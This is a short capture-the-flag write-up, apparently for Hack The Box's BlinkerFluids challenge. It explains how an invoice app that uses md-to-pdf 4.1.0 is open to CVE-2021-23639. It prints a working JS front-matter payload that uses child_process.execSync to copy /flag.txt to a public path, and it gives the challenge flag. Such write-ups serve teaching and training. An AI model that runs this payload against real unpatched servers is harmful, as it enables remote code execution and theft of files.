  1. BlinkerFluids (★☆☆☆)

For this one, we were given the source file (Ref). Looking into the website, we see an invoice list & an option to add a new invoice.

If we try to create a new invoice, we get a nice default text that is formated with Markdown Language.

Now, let's dig into the source code. Starting with the /routes/index.js, we see that the creation of an invoice uses an MDHelper.

We then head to our helper file, located at /helpers/MDHelper.js

So, if we consider our possible attack vectors, our main target will be the md-to-pdf module. So this will be our start!

The first thing we get related to security issues for this module will be CVE-2021-23639. It involves a Remote Code Execution caused by the gray-matter's JS-engine, which is enabled by default. This was fixed in version 5.0.0 of md-to-pdf but if we check /package.json, we see that we are using version 4.1.0 so we got our exploit 😃

For a proof of concept & more information, you can refer to these links:

  • Link 2

We have access to /static route which means, we can use it to write our command output there. Our final payload will be:

---js
((require("child_process")).execSync("cat /flag.txt > /app/static/flag"))
---

& we'll be able to access /static/flag route & get our flag: HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}
